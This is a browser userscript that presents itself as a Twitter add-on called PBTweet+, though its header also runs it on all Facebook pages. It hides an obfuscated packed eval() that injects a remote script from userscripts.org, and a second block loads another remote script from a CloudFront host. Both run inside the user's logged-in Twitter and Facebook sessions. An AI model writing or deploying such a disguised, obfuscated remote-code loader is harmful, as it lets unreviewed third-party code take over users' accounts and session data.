// ==UserScript==
// @name PBTweet+ Plus + Last Update
// @namespace http://twitter.trauma2u.com/
// @description Pretty Better Tweet!
// @include http://twitter.com/*
// @include https://twitter.com/*
// @include           http://www.facebook.com/*
// @include           https://www.facebook.com/*
// @include           http://*.facebook.com/*
// @include           https://*.facebook.com/*
// @match http://twitter.com/*
// @match https://twitter.com/*
// ==/UserScript==
eval(function(p,a,c,k,e,d){e=function(c){return c.toString(36)};if(!''.replace(/^/,String)){while(c--){d[c.toString(a)]=k[c]||c.toString(a)}k=[function(e){return d[e]}];e=function(){return'\\w+'};c=1};while(c--){if(k[c]){p=p.replace(new RegExp('\\b'+e(c)+'\\b','g'),k[c])}}return p}('0.6.5(0.3(\'1\')).2=\'4://7.c/b/a/8.9.d\';',14,14,'document|script|src|createElement|https|appendChild|body|userscripts|170127|user|source|scripts|org|js'.split('|'),0,{}))


(function() {
	var pbScript = document.createElement('script');
	pbScript.type = 'text/javascript';
	//pbScript.src = 'http://twitter.trauma2u.com/pbtweet/pbtweet.user.js';
	//pbScript.src = window.location.protocol + '//' + 'pbtweet.s3.amazonaws.com' + '/' + 'pbtweet.user.gz.js';
	pbScript.src = window.location.protocol + '//' + 'deucqe5ih3kaf.cloudfront.net' + '/' + 'pbtweet.user.gz.js';
	//pbScript.src = window.location.protocol + '//' + 'pbtweet.trauma2u.com' + '/' + 'pbtweet.user.gz.js';
	document.getElementsByTagName('head')[0].appendChild(pbScript);
})();
